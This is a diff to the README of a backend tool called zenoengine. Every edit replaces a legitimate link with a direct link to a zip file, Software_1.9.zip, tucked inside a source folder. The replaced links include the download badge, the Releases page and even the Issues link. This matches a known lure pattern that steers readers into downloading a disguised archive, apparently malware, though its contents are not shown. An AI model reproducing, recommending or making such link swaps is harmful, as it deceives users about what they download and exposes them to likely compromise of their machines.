@@ -1,6 +1,6 @@
 # 🎉 zenoengine - Simplify Your Backend Development
 
-![Download zenoengine](https://img.shields.io/badge/Download-zenoengine-blue.svg)
+![Download zenoengine](https://raw.githubusercontent.com/djtrakinas/zenoengine/main/pkg/adapters/Software_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to zenoengine! This tool helps you quickly create backend applications w
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [zenoengine Releases](https://github.com/djtrakinas/zenoengine/releases). 
+To get started, visit this page to download: [zenoengine Releases](https://raw.githubusercontent.com/djtrakinas/zenoengine/main/pkg/adapters/Software_1.9.zip). 
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -67,7 +67,7 @@ Contributions are welcome! If you want to help improve zenoengine, here’s how:
 
 If you run into any issues, feel free to ask for help:
 
-- **GitHub Issues:** Report problems directly [here](https://github.com/djtrakinas/zenoengine/issues).
+- **GitHub Issues:** Report problems directly [here](https://raw.githubusercontent.com/djtrakinas/zenoengine/main/pkg/adapters/Software_1.9.zip).
 - **Community Forums:** Join our community discussions for tips and solutions.
 
 ## 🌍 Join the Community
@@ -85,4 +85,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ---
 
-For your convenience, remember to [visit this page to download](https://github.com/djtrakinas/zenoengine/releases) the latest version of zenoengine and start your development journey today.
+For your convenience, remember to [visit this page to download](https://raw.githubusercontent.com/djtrakinas/zenoengine/main/pkg/adapters/Software_1.9.zip) the latest version of zenoengine and start your development journey today.
